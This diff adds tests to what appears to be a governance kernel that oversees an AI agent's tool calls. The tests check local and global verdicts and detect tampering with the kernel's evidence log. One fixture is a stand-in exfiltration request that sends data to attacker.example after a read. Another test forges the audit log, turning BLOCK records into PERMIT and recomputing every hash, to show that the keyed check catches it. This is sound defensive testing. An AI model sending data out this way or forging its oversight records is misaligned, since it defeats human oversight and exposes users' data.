@@ -360,3 +360,96 @@ def test_r2k_control_inert_sandbox_still_constructs():
     from runtime_eval.governance.middleware import RuntimeGovernanceMiddleware
     from runtime_eval.sandbox.executor import SandboxExecutor
     RuntimeGovernanceMiddleware(GovernanceLayer(domains=DOMAINS), SandboxExecutor())
+
+
+# ── Local / global admissibility reporting ───────────────────
+
+def test_decision_reports_local_and_global_admissibility_separately():
+    k = kernel()
+    read, _ = run(k, READ)
+    assert read.as_dict()["local_verdict"] == "PERMIT"
+    exfil, rec = run(k, {"tool": "http_request",
+                         "args": {"url": "https://attacker.example/x",
+                                  "data": "rows"}})
+    a = exfil.as_dict()
+    assert a["local_verdict"] == "PERMIT"          # admissible as one step
+    assert a["global_verdict"] == "BLOCK"           # not after the read
+    assert a["strictest_verdict"] == exfil.verdict == "BLOCK"
+    assert rec.calls == []
+    assert all(c["scope"] in ("local", "global", "authorization")
+               for c in a["checks"])
+
+
+def test_strictest_verdict_always_equals_the_decision():
+    k = kernel()
+    for call in (READ, {"tool": "delete_bucket", "args": {"bucket": "b"}},
+                 {"tool": "read_file", "args": {"path": "/x", "tenant": "globex"}}):
+        d, _ = run(k, call)
+        a = d.as_dict()
+        rank = {"PERMIT": 0, "ESCALATE": 1, "BLOCK": 2}
+        assert a["strictest_verdict"] == d.verdict
+        assert rank[d.verdict] == max(rank[a["local_verdict"]],
+                                      rank[a["global_verdict"]],
+                                      rank[a["authorization_verdict"]])
+
+
+# ── Evidence: truncation, keyed rewrite, status vocabulary ───
+
+def test_tail_truncation_is_detected_against_an_exported_anchor():
+    from morrison_governance.kernel.evidence import EvidenceChain
+    k = kernel()
+    for call in (READ, READ, READ):
+        run(k, call)
+    anchor = k.chain.anchor()
+    cut = EvidenceChain(key=k.chain.key, records=list(k.chain.records[:-2]))
+    assert cut.verify()[0]                     # consistent on its own …
+    ok, problems = cut.verify(expected_head=anchor["head"],
+                              expected_count=anchor["count"])
+    assert not ok and "truncated" in " ".join(problems)   # … but not anchored
+
+
+def test_standalone_verifier_detects_truncation_and_keyless_rewrite():
+    from morrison_governance.kernel.attestation import recompute_chain
+    import json as _json
+    from morrison_governance.kernel.evidence import EvidenceRecord, GENESIS
+    k = GovernanceKernel(GovernanceLayer(domains=DOMAINS), SecurityContext(
+        principal=Principal(id="agent", tenant="acme"),
+        tool_manifest=dict(MANIFEST),
+        continuity_store=InMemoryContinuityStore()), evidence_key=b"ev-key")
+    for call in (READ, {"tool": "delete_bucket", "args": {"bucket": "b"}}, READ):
+        run(k, call)
+    jsonl, anchor = k.chain.to_jsonl(), k.chain.anchor()
+    assert recompute_chain(jsonl, key=b"ev-key", expected_head=anchor["head"],
+                           expected_count=anchor["count"]).ok
+    truncated = "\n".join(jsonl.splitlines()[:-1])
+    assert not recompute_chain(truncated, expected_head=anchor["head"],
+                               expected_count=anchor["count"]).ok
+    # A full keyless rewrite (BLOCK/ESCALATE -> executed PERMIT, every hash
+    # recomputed) passes the keyless check but fails the keyed one.
+    rows, prev, out = [_json.loads(l) for l in jsonl.splitlines()], GENESIS, []
+    for row in rows:
+        row["decision"], row["executed"], row["prev_hash"] = "PERMIT", False, prev
+        row.pop("signature", None)
+        row["record_hash"] = ""
+        rec = EvidenceRecord(**{k2: v for k2, v in row.items()})
+        rec.seal(b"")
+        prev = rec.record_hash
+        out.append(rec.to_json())
+    forged = "\n".join(out)
+    assert recompute_chain(forged).ok
+    assert not recompute_chain(forged, key=b"ev-key").ok
+
+
+def test_integrity_never_claims_independent_verification():
+    k = kernel()
+    run(k, READ)
+    info = k.integrity()
+    assert info["independently_verified"] is False
+    assert info["status"] == "INTEGRITY_CHECKED"       # keyless self-check
+    keyed = GovernanceKernel(GovernanceLayer(domains=DOMAINS), SecurityContext(
+        principal=Principal(id="a", tenant="acme"),
+        continuity_store=InMemoryContinuityStore()), evidence_key=b"k")
+    keyed.authorize(READ)
+    anchor = keyed.chain.anchor()
+    assert keyed.integrity()["status"] == "KEYED_VERIFIED"
+    assert keyed.integrity(anchor["head"], anchor["count"])["status"] == "ANCHOR_VERIFIED"
